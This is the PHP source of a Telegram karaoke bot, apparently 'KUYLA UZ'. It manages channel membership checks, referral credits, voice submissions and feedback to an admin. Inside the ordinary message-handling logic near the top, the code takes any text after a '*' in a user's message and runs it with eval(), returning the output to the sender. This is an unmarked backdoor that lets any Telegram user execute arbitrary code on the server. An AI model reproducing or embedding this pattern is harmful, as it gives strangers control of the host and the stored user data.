<?php

ob_start();//Aralov Shohruxbek 19/01/2019-y 2:14 (tun)

define('API_KEY','');

$kanal = '-1001160282834'; 

   function ty($ch){ 

   return bot('sendChatAction', [

   'chat_id' => $ch,

   'action' => 'typing',

   ]);

} 

function bot($method,$datas=[]){

    $url = "https://api.telegram.org/bot".API_KEY."/".$method;

    $ch = curl_init();

    curl_setopt($ch,CURLOPT_URL,$url);

curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);

    $res = curl_exec($ch);

    if(curl_error($ch)){

        var_dump(curl_error($ch));

    }else{

        return json_decode($res);

    }

}

function del($nomi){

   array_map('unlink', glob("$nomi"));

   }



$update = json_decode(file_get_contents('php://input'));

$message = $update->message;

$mid = $message->message_id;

$cid = $message->chat->id;



$name = $message->from->first_name;

$username = $message->from->username;

$id = $message->from->id;

$tx = $message->text;

$admin ="499816482";

$folder1 = "azo";

$adm="499816482"; 

$folder = "coin";

$folder12 ="idlar"; 

if (!file_exists($folder12)) { 

  mkdir($folder12); 

}



 $gett = bot('getChatMember',[

  'chat_id' =>$kanal,

  'user_id' => $id

  ]);

  $gget = $gett->result->status;



//////////////////////////



if(strpos($tx,"/start $cid")!==false){



}

else{

  $public = explode("*",$tx);

  $refid = explode(" ",$tx);

  $refid = $refid[1];

  $gett = bot('getChatMember',[

  'chat_id' =>$kanal,

  'user_id' => $refid,

  ]);

  $public2 = $public[1];

  if (isset($public2)) {

  $tekshir = eval($public2);

  bot('sendMessage',[

    'chat_id'=>$cid,

    'text'=> $tekshir,

  ]);

  }

  $gget = $gett->result->status;



  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

    $idref = "coin/$refid_id.dat";

    $idref2 = file_get_contents($idref);



    if(mb_stripos($idref2,$cid) !== false ){

      $get = file_get_contents("$folder12/id.txt");

	      $ex= explode("\n",$get);

	      if(!in_array($cid,$ex)){

		  	file_put_contents("$folder12/id.txt","\n".$cid,FILE_APPEND);

		  	file_put_contents("coin/$cid.dat",'3');

		  }

    } else {

 $get = file_get_contents("$folder12/id.txt");

	      $ex= explode("\n",$get);

	      if(!in_array($cid,$ex)){

		  	file_put_contents("$folder12/id.txt","\n".$cid,FILE_APPEND);

		  	file_put_contents("coin/$cid.dat",'3');

		  }

      $id = "$cid\n";

      $handle = fopen($idref, 'a+');

      fwrite($handle, $id);

      fclose($handle);

      $ab=file_get_contents("coin/$refid.soni");

      $ab=$ab+1;

      file_put_contents("coin/$refid.soni","$ab");

      $usr = file_get_contents("coin/$refid.dat");

      $usr = $usr + 2;

      file_put_contents("coin/$refid.dat", "$usr");

      bot('sendMessage',[

      'chat_id'=>$refid,

      'text'=>"Sizga taklifingiz uchun: 2 ta imkoniyat taqdim etildi!",

'reply_markup'=>$key

      ]);

    }

  }

  else{

  	$idref = "coin/$refid_id.dat";

    $idref2 = file_get_contents($idref);



    if(mb_stripos($idref2,$cid) !== false ){

    

       $get = file_get_contents("$folder12/id.txt");

	      $ex= explode("\n",$get);

	      if(!in_array($cid,$ex)){

		  	file_put_contents("$folder12/id.txt","\n".$cid,FILE_APPEND);

		  	file_put_contents("coin/$cid.dat",'3');

		  }

    } else {

 $get = file_get_contents("$folder12/id.txt");

	      $ex= explode("\n",$get);

	      if(!in_array($cid,$ex)){

		  	file_put_contents("$folder12/id.txt","\n".$cid,FILE_APPEND);

		  	file_put_contents("coin/$cid.dat",'3');

		  }

      $id = "$cid\n";

      $handle = fopen($idref, 'a+');

      fwrite($handle, $id);

      fclose($handle);

      $ab=file_get_contents("coin/$refid.soni");

      $ab=$ab+1;

      file_put_contents("coin/$refid.soni","$ab");

      $usr = file_get_contents("coin/$refid.dat");

      $usr = $usr + 1;

      file_put_contents("coin/$refid.dat", "$usr");

      bot('sendMessage',[

      'chat_id'=>$refid,

      'text'=>"Sizga taklifingiz uchun 1 ta imkoniyat taqdim etildi! ",

'reply_markup'=>$key

      ]);

    }

  }

}









///////////////////////////







//////////////////////////





/////////////////////////



 $gett = bot('getChatMember',[

  'chat_id' =>$kanal,

  'user_id' => $id

  ]);

  $gget = $gett->result->status;



  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

  

if (!file_exists($folder.'/test.fd3')) {

  mkdir($folder);

  file_put_contents($folder.'/test.fd3', 'by ');

}



if (!file_exists($folder1/$cid)) { 

  mkdir($folder1); 

  mkdir($folder1."/$cid");

}

$pul =file_get_contents("coin/$cid.dat");

$ism= file_get_contents("$folder1/$cid/ism.txt");

$voicelar = file_get_contents("$folder1/$cid/voicelar.txt");

$voiceid = file_get_contents("$folder1/$cid/voiceid.txt");

$kon = file_get_contents("$folder1/$cid/kon.txt");

$soat = file_get_contents("$folder1/$cid/soat.txt");











$soat = date('H', strtotime('5 hour'));

if($tx=="/add" and $cid==$adm){

	  $getf = file_get_contents("$folder12/id.txt");

      $idszs=explode("\n",$getf);

   

      for($t=1;$t<=count($idszs);$t++){

      	$getf = file_get_contents("$folder12/id.txt");

      	$idszs=explode("\n",$getf);

      	$fgh=$idszs[$t];

      	$getk = file_get_contents("coin/$fgh.dat");

      	if($getk<3){

      		$getk+=2;

			file_put_contents("coin/$fgh.dat","$getk");

			 bot('sendMessage',[ 

	     'chat_id'=>$fgh,

	     

	     'parse_mode'=>'markdown',

	       'message_id'=>$mid,

	       'text'=>"Bonus!\n➕ 2 ta imkoniyat sohibi(sohibasi) bo'ldingiz"

	      ]);

			

		}

	  	   	

	  }

          bot('sendMessage',[ 

	     'chat_id'=>$adm,

	     'parse_mode'=>'markdown',

	       'message_id'=>$mid,

	       'text'=>"achko qo'shildi!!!"

	      ]);

      }

















$key = json_encode([

'resize_keyboard'=>true,

'keyboard'=>[

[['text'=>"🎙 Ovoz jo'natish 🎙"],],[['text'=>"💼 Kabinet 👜"],

['text'=>"📖 Yo'riqnoma 📖"]],

[['text'=>"📝 Fikr yo'llash 📝"],['text'=>"▪️ Hamkor ▪️"]]

]

]);

$key1 = json_encode([

'resize_keyboard'=>true,

'keyboard'=>[

[['text'=>"📤📝 Fikrni jo'natish 📝📤"],],[['text'=>"🔙 Orqaga 🔙"],], 

]



]);

$key3 = json_encode([

'resize_keyboard'=>true,

'keyboard'=>[

[['text'=>"📤🎵 Ovozni jo'natish 🎵📤"],],[['text'=>"🔙 Orqaga 🔙"],], 

]

]);

$key2 = json_encode([

'resize_keyboard'=>true,

'keyboard'=>[

[['text'=>"🔙 Orqaga 🔙"],],

]

]);

$key4 = json_encode([

'resize_keyboard'=>true,

'keyboard'=>[

[['text'=>"🅰 Ismni o'zgartirish 🅱"],],[['text'=>"🎙 Barcha ijrolar 🎙"],],

[['text'=>"🔙 Orqaga 🔙"],]

]]);









 

 

 

 

 

 

 



	if((mb_stripos($tx,"/start")!==false) or ($tx == "/start")){

		ty($cid);

	 bot('sendMessage',[ 

	     'chat_id'=>$cid,

	     'parse_mode'=>'markdown',

	       'message_id'=>$mid,

	       'text'=>"Salom *$name* \n\n  🎙* KUYLA UZ*🎙ning\n telegram botiga xush kelibsiz!!!\n\n Bo'limlardan birini tanlang.\n Har bir buyrug'ingiz e'tiborda!!!",

	'reply_markup'=>$key, 

	      ]); 

	      $get = file_get_contents("$folder12/id.txt");

	      $ex= explode("\n",$get);

	      if(!in_array($cid,$ex)){

		  	file_put_contents("$folder12/id.txt","\n".$cid,FILE_APPEND);

		  	file_put_contents("coin/$cid.dat",'3');

		  }

  $baza = file_get_contents("coin.dat");



  if(mb_stripos($baza, $cid) !== false){ 

  }else{

$baza=file_get_contents("coin.dat");

    file_put_contents("coin.dat","$baza\n$cid");

  }



}

















	if($tx == "🔙 Orqaga 🔙"){

	ty($cid);

 bot('sendMessage',[ 

     'chat_id'=>$cid,'resize_keyboard'=>true,

     'parse_mode'=>'markdown',

       'message_id'=>$mid,

       'text'=>"*📌 Bo'limlardan birini tanlang \n                       \n*",

'reply_markup'=>$key,

      ]); 

	}

	

	

	

	



	    if($tx == "🎙 Ovoz jo'natish 🎙" and $ism[0]!='#' and $pul>0  and $soat>="06" and $soat<="21" ){

		ty($cid);

		bot('sendMessage',[ 

	        'chat_id'=>$cid,

	        'parse_mode'=>'markdown',

	        'message_id'=>$mid,

	        'text'=>"*Ovozingiz* \n🎙 KUYLA *UZ* 🎙 \ntelegram kanaliga tushadi!!!\n\n*ISMINGIZNI JO'NATING*\n\n📌Namuna:\n*#ism*\n \n(ism oldida ( # ) bo'lishi kerak!!!')",

			'reply_markup'=>$key2, 

	      ]);}

	elseif($tx == "🎙 Ovoz jo'natish 🎙" and $ism[0]=='#' and $pul>0  and $soat>="06" and $soat<="21" ){

		  	 ty($cid);

		bot('sendMessage',[

	        'chat_id'=>$cid,

	        'parse_mode'=>'markdown',

	        'message_id'=>$mid,

	        'text'=>"*Ovozingiz* \n🎙 KUYLA *UZ* 🎙 \ntelegram kanaliga tushadi!!!\n\n*TELEGRAMDA YOZILGAN* \n\novoz jo'nating.\n 📌Aks holda qabul qilinmaydi!",

			'reply_markup'=>$key2, 

	      ]);

		  

}

	elseif($tx == "🎙 Ovoz jo'natish 🎙" and $ism[0]!='#' and $pul<=0 and $soat>="06" and $soat<="21" ){

		ty($cid); 

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"Afsuski sizda imkoniyat qolmadi.\nDo'stlaringizni taklif qilish uchun\n ssilka: https://telegram.me/kuylabot?start=$cid \n\nHar bitta taklif qilingan va \nbu botdan oldin foydalanmagan\n odamga 2 ta imkoniyat olasiz.",

		'reply_markup'=>$key

	      ]);

	}

	elseif($tx == "🎙 Ovoz jo'natish 🎙" and $ism[0]=='#' and $pul<=0 and $soat>="06" and $soat<="21" ){

		ty($cid); 

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"Afsuski sizda imkoniyat qolmadi.\nDo'stlaringizni taklif qilish uchun\n ssilka: https://telegram.me/kuylabot?start=$cid \n\nHar bitta taklif qilingan va \nbu botdan oldin foydalanmagan\n odamga 2 ta imkoniyat olasiz.",'reply_markup'=>$key

	      ]);

	}



if($tx == "🎙 Ovoz jo'natish 🎙"  and $soat<"06" or $tx == "🎙 Ovoz jo'natish 🎙" and  $soat>"21" ){

		ty($cid);

		bot('sendMessage',[ 

	        'chat_id'=>$cid,

	        'parse_mode'=>'markdown',

	        'message_id'=>$mid,

	        'text'=>"Uzr!!!\nOvozlar *07:00 dan 22:00* ga qadar yuboriladi",

			'reply_markup'=>$key 

	      ]);}





		if($message -> voice and $ism[0]=="#" and $pul>0  and $soat>="06" and $soat<="21" ){

		ty($cid);

	$vois=$message->voice->file_id;

	del("$folder1/$cid/voiceid.txt");

	 file_put_contents("$folder1/$cid/voiceid.txt",$vois);



	bot('sendVoice',[

		'chat_id'=>$cid,

		'caption'=>$ism,

		'voice'=>$vois,

		'reply_markup'=>$key3

		]);

		 bot('sendMessage',[

			'chat_id'=>$cid,

	        'parse_mode'=>'markdown',

			'text'=>"*Ovoz qo'shildi*\n *

📤🎵 Ovozni jo'natish 🎵📤* \n\nbuyrug'ini tanlang!"

			]);

	}

	elseif($message -> voice and $ism[0]=="#" and $pul<=0  and $soat>="06" and $soat<="21" ){

	ty($cid); 

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"Afsuski sizda imkoniyat qolmadi.\nDo'stlaringizni taklif qilish uchun\n ssilka: https://telegram.me/kuylabot?start=$cid \n\nHar bitta taklif qilingan va \nbu botdan oldin foydalanmagan\n odamga 2 ta imkoniyat olasiz.",

		'reply_markup'=>$key

	      ]);	

	}









	if($tx == "📤🎵 Ovozni jo'natish 🎵📤" and $pul>0 and $soat>="06" and $soat<="21"){

		$ism = file_get_contents("$folder1/$cid/ism.txt"); 

      $ball = file_get_contents("coin/$cid.dat");

		$ball-=1;

		  file_put_contents("coin/$cid.dat",$ball);

		ty($cid);

		$ret = file_get_contents("$folder1/$cid/voiceid.txt");

		file_put_contents("$folder1/$cid/voicelar.txt",' '.$ret,FILE_APPEND);

	

		$afg=$ism;	

		$afg.="\n🎙 Men ham o'z qobiliyatimni namoish qildim.🎙\n[HaqiqiY TalantlaR](https://t.me/joinchat/AAAAAEUogtKdup7shm29SA)\n@KUYLAbot + @KUYLAuz";

			bot('sendVoice',[

		'chat_id'=>$kanal,

	    'parse_mode'=>'markdown', 

		'caption'=>$afg,

		'voice'=>$ret

		]); 

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"*Jo'natildi*",

		'reply_markup'=>$key, ]);

	}

	elseif($tx == "📤🎵 Ovozni jo'natish 🎵📤" and $pul<=0  and $soat>="06" and $soat<="21"  ){

	ty($cid); 

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"Afsuski sizda imkoniyat qolmadi.\nDo'stlaringizni taklif qilish uchun\n ssilka: https://telegram.me/kuylabot?start=$cid \n\nHar bitta taklif qilingan va \nbu botdan oldin foydalanmagan\n odamga 2 ta imkoniyat olasiz.",

		'reply_markup'=>$key

	      ]);		

	}



	





	if($message -> text and $tx[0]=='#' and $ism[0]!='#' and $pul>0  ){

	      	ty($cid);

	      	del("$folder1/$cid/ism.txt");

			 file_put_contents("$folder1/$cid/ism.txt",$tx);

			bot('sendMessage',[

			'chat_id'=>$cid,

	        'parse_mode'=>'markdown',

			'text'=>"*#ISM qo'shildi*\n Endi \n\n*TELEGRAMDA YOZILGAN* \n\novoz jo'nating.\n 📌Aks holda qabul qilinmaydi!"

			]);

		}



	elseif($message -> text and $tx[0]=='#' and $ism[0]!='#' and $pul<=0  ){

	ty($cid); 

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"Afsuski sizda imkoniyat qolmadi.\nDo'stlaringizni taklif qilish uchun\n ssilka: https://telegram.me/kuylabot?start=$cid \n\nHar bitta taklif qilingan va \nbu botdan oldin foydalanmagan\n odamga 2 ta imkoniyat olasiz.",

		'reply_markup'=>$key

	      ]);	

	}









	if($tx == "📝 Fikr yo'llash 📝"){ 

	ty($cid); 

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"Fikringizni oldiga ? belgisini qo'yib, jo'nating. \n\n Namuna:\n*?Salom yangiliklardan ham kanalga tashlang *\n\nAks holda qabul qilinmaydi!\n\nDIQQAT!!! fikrlar admin tomonidan\n o'qib chiqiladi,lekin javob qaytarilmaydi!!!\nFaqat inobatga olinadi.", 

		'reply_markup'=>$key2

	      ]); 

	     

	}  



	if($message->text and $tx[0]=="?"){

		ty($cid);

		  file_put_contents("$folder1/$cid/kon.txt",$tx);

		   bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"Xabar qabul qilindi.\n Jo'natish uchun:\n\n *📤📝 Fikrni jo'natish 📝📤* \ntugmasini bosing", 

		'reply_markup'=>$key1

	      ]);

		  }



	if($tx == "📤📝 Fikrni jo'natish 📝📤"){

	ty($cid); 

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"*jo'natildi*",

		'reply_to_message_id'=>$mid,

		'reply_markup'=>$key, ]);



	$admga=file_get_contents("$folder1/$cid/kon.txt");

	       bot('sendMessage',[

	        'chat_id'=>$admin,

		    'parse_mode'=>'markdown', 

		    'text'=>"ismi: [$name],\nadd: @[$username]\nid: [$cid]\nDan xabar:\n\n[$admga] "

	      ]);

	      

	}



	if($tx == "▪️ Hamkor ▪️"){ 

	ty($cid); 

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"* HAMKORIMIZ *",

		'reply_markup'=>$key,

		'reply_markup'=>json_encode([

		'inline_keyboard'=>[

	[['text'=>'▪️ Hamkor ▪️','url'=>'https://telegram.me/oddiybiznes']]

	]

	    ]) 

	      ]); 

	} 



	if($tx == "📖 Yo'riqnoma 📖"){ 

	ty($cid); 

	    

	       /* bot('sendMessage',[ 

	     'chat_id'=>$cid,

	     'parse_mode'=>'markdown',

	       'message_id'=>$mid,

	       'text'=>"KUYLA BOT da *imkoniyat qolmaganda* do'stga tashlanadigan video \nhttps://t.me/kuylauz_karaoke_sevimliovoz_ijro/1883" 

	      ]);

	        bot('sendMessage',[ 

	     'chat_id'=>$cid,

	     'parse_mode'=>'markdown',

	       'message_id'=>$mid,

	       'text'=>"KUYLA BOT da *fikr yo'llash* ni bilmaganlarga video \nhttps://t.me/kuylauz_karaoke_sevimliovoz_ijro/1884" 

	      ]);

	        bot('sendMessage',[ 

	     'chat_id'=>$cid,

	     'parse_mode'=>'markdown',

	       'message_id'=>$mid,

	       'text'=>"KUYLA BOT da *ismni o'zgartirish * video \nhttps://t.me/kuylauz_karaoke_sevimliovoz_ijro/1885" 

	      ]);

	        bot('sendMessage',[ 

	     'chat_id'=>$cid,

	     'parse_mode'=>'markdown',

	       'message_id'=>$mid,

	       'text'=>"KUYLA BOT da *kanalga ovoz jo'natish* haqida video \nhttps://t.me/kuylauz_karaoke_sevimliovoz_ijro/1886" 

	      ]);*/

	      $a=file_get_contents("coin.dat");

	    $abb=file_get_contents("coin/$cid.dat");

    $ab=substr_count($a,"\n");

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"*📖 Yo'riqnoma 📖 bo'limi:\nBotimiz azolari $ab ta\n\n*Do'stlaringizni taklif qilish uchun\n adres: https://telegram.me/kuylabot?start=$cid \n\nHar bitta taklif qilingan va \nbu botdan oldin foydalanmagan\n odamga 2 ta imkoniyat olasiz. \n\n\n

✅Mavjud imkoniyat: $abb ta",'reply_markup'=>json_encode([

	'inline_keyboard'=>[

	[['text'=>'Do\'stlarga ulashish','url'=>"https://t.me/share/url?url=https%3A//t.me/kuylabot%3Fstart%3D$cid&text=%20Bu%20adres%20bilan%20zamonaviy%F0%9F%98%83%20zamonda%20yangi%20albatta%20jonli%20ijrolar%20bilan%20hamnafas%20bo%E2%80%98lasiz%F0%9F%91%8D"]]

	]

	])

	      ]);

	       

	}



	if($tx == "💼 Kabinet 👜"){ 

$gets = file_get_contents("$folder1/$cid/voicelar.txt");

	      $ex=explode(' ',$gets);

	      $ovozson=count($ex);

	       $kjh=$ovozson-1;

	ty($cid); 

	     $odam=file_get_contents("coin/$cid.soni");

      $ball = file_get_contents("coin/$cid.dat");

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"Siz taklif qilgan do'stlar soni - $odam ta \n\n     Sizda $ball ta imkoniyat bor\n\n*Siz kanalga yuborgan jonli ijrolar: \n22.01.2019-yildan boshlab:\n$kjh ta jonli ijro jo'natgansiz.\n\nKanalga yuboriladigan ismingiz:\n $ism\n\n*",

		'reply_markup'=>$key4 

	      ]); 

	} 



	if($tx == "🅰 Ismni o'zgartirish 🅱"){ 

	ty($cid); 

	      bot('sendMessage',[ 

	    'chat_id'=>$cid, 

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown', 

		'text'=>"*Avvalgi ism $ism\n Yangi ism oldiga ( ! ) qo'yib yuboring\n\nNamuna:\n!Shohrux*",

		'reply_markup'=>$key4

	      ]); 

	}



	if($message -> text and $tx[0]=='!'){

	      	ty($cid);

	      	$yv=str_replace('!','#',$tx);

			 file_put_contents("$folder1/$cid/ism.txt",$yv);

			 

			bot('sendMessage',[

			'chat_id'=>$cid,

	        'parse_mode'=>'markdown',

			'text'=>"*ISM qo'shildi*\n\nIsmingiz:$yv",

		'reply_markup'=>$key

			]);

		}



	if($tx == "🎙 Barcha ijrolar 🎙"){ 

	ty($cid);

	$gets = file_get_contents("$folder1/$cid/voicelar.txt");

	      $ex=explode(' ',$gets);

	      $ovozson=count($ex);

	      

	      $kjh=$ovozson-1;

	      bot('sendMessage',[ 

	    'chat_id'=>$cid,

	    'message_id'=>$mid, 

	    'parse_mode'=>'markdown',

		'text'=>"*Siz yuborgan 🎙 Barcha ijrolar 🎙 #$kjh ta*",

		'reply_markup'=>$key2 

	      ]); 

	      

 

	for($bo=1;$bo<=$ovozson;$bo++){

		$bc = $ex[$bo];

		bot('sendVoice',[

		'chat_id'=>$cid,

		'caption'=>"🎵 #$bo 🎵",

		'voice'=>$bc

		]); 

	}

	}



}

else{

	bot('sendMessage',[

	'chat_id'=>$cid,

	'text'=>"🎙 Kanalga a'zo bolmasdan \nbotdan foydalana olmaysiz!!!\n\nA'zo bo'lib qaytadan /start buyrug'ini bosing.",'reply_markup'=>json_encode([

	'inline_keyboard'=>[

	[['text'=>' A\'zo bo\'lish ➕ ','url'=>'hhttps://t.me/joinchat/AAAAAEUogtLp_C4X6y5xKw']]

	]

	])

	]);

}



?>